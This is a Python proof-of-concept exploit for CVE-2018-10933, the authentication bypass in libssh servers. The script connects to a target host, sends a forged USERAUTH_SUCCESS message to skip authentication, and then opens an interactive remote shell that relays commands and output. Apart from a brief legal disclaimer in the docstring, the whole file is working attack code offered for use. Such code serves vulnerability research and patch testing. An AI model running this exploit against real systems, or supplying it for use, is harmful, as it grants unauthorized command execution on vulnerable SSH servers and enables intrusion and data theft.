#!/usr/bin/env python
# -*- coding: utf-8 -*-
""" CVE-2018-10933-SHELL-POC.py

    Quick and dirty exploit for libssh <0.8.4 or <0.7.6 server-side
    authentication-bypass vulnerability (CVE-2018-10933).

    See https://github.com/e3prom/miscsec/tree/master/CVE-2018-10933
    for more information.

    Disclaimer: the use of this exploit on a server without the
    owner's authorization may be illegal in your juridication.
    Please check your local laws and regulation before using this
    software.

"""
import paramiko
import socket
import sys
import time
import argparse

sock = socket.socket()

def start():
    try:
        # establish TCP socket
        sock.connect((args.hostname, int(args.port)))
        # instantiate SSH transport
        transport = paramiko.transport.Transport(sock)
        transport.start_client()

        # build out-of-state USERAUTH_SUCCESS message
        m = paramiko.message.Message()
        m.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)

        # send USERAUTH_SUCCESS message
        transport._send_message(m)

        # open channel session
        channel = transport.open_session()

        # request PTY
        channel.get_pty()

        # request shell
        channel.invoke_shell()

        # print user instructions
        if args.verbose: print("[*] Type 'quit' to exit this command prompt.\n")

        while True:
            # when in verbose mode, print command prompt
            if args.verbose:
                command = raw_input('$ ')
            else:
                command = raw_input()

            # break when 'quit' is entered.
            if command == 'quit':
                break

            # send command, including new-line character.
            channel.send(command + '\n')

            # while loop: when the channel is ready, print returned data.
            while True:
                if channel.recv_ready():
                    output = channel.recv(1024)
                    # make sure there's a carriage-return and that we strip
                    # the prompt symbol before and after the returned output.
                    sys.stdout.write('\r' + output[len(command)+2:-2] + '' * 16)
                    sys.stdout.flush()
                else:
                    time.sleep(0.2)
                    if not(channel.recv_ready()):
                        break

        # close transport
        transport.close()

    except socket.error:
        print("[-] Connection to %s on port %s failed.") % (args.hostname, args.port)
        sys.exit(1)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='CVE-2018-10933 Exploit PoC')
    parser.add_argument('--verbose', help='enable verbose output', action='store_true')
    parser.add_argument('-p', '--port', help='port to connect to (default: 2222)', type=int, default=2222)
    parser.add_argument('hostname', help='server IP address or hostname')
    args = parser.parse_args()

    start()
